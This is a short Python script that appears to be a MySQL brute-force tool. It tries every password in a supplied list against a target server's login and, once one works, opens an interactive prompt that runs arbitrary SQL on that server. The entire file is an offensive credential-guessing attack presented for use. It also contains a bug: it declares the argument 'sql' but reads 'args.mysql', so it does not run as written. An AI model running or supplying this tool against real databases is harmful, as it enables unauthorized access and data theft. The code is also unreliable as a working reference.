import mysql.connector
from mysql.connector import Error
import argparse
import sys
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def try_login(target_ip, username, password):
    try:
        # Connect to the MySQL server
        connection = mysql.connector.connect(
            host=target_ip,
            user=username,
            password=password
        )

        if connection.is_connected():
            print(f"{Fore.GREEN}KEY FOUND: [{password}]")
            return True
    except Error as e:
        print(f"{Fore.RED}Trying Passphrase: \"{password}\" {Style.RESET_ALL}...Failed")
        return False
    return False

def execute_commands(target_ip, username, password):
    try:
        connection = mysql.connector.connect(
            host=target_ip,
            user=username,
            password=password
        )

        if connection.is_connected():
            cursor = connection.cursor()
            while True:
                cmd = input(f"{Fore.YELLOW}MySQL> ")
                if cmd.lower() == 'exit':
                    print(f"{Fore.CYAN}Exiting MySQL client...")
                    break
                cursor.execute(cmd)
                result = cursor.fetchall()
                for row in result:
                    print(row)

    except Error as e:
        print(f"{Fore.RED}Failed to execute command: {e}")

def main():
    # Argument parsing
    parser = argparse.ArgumentParser(description="MySQL Brute Forcer")
    parser.add_argument('-l', '--username', required=True, help='MySQL username')
    parser.add_argument('-P', '--passwordlist', required=True, help='Password list file')
    parser.add_argument('sql', help='Target MySQL IP in format mysql://<target-ip>')

    args = parser.parse_args()

    # Extract target IP from the input URL
    target_ip = args.mysql.split('://')[1]

    # Load passwords from the file
    with open(args.passwordlist, 'r') as f:
        passwords = [line.strip() for line in f.readlines()]

    # Try each password
    for password in passwords:
        if try_login(target_ip, args.username, password):
            # If the correct password is found, allow executing MySQL commands
            execute_commands(target_ip, args.username, password)
            break
    else:
        print(f"{Fore.RED}KEY NOT FOUND{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
